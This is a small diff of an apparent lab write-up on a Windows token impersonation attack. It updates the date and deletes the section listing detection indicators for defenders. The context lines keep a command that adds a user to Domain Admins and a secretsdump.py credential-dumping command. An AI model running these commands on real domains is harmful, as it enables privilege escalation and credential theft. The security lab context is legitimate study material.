@@ -1,6 +1,6 @@
 # token impersonation attack
 
-**Date:** May 2026  
+**Date:** June 2026  
 **Author:** ShahinSecLab  
 **Category:** Network Attack / Credential Capture  
 **Difficulty:** Easy  
@@ -483,17 +483,6 @@ net group "Domain Admins" test /ADD /DOMAIN
 
  secretdump.py readteambd.local/testuser:@terstuser#!
 
-
-
-## Detection
-
-Things defenders can look for:
-
-Unusual privilege escalation activity
-New processes running as Administrator
-Event ID 4624
-Event ID 4672
-Event ID 4688
 
 # Key Takeaways
 
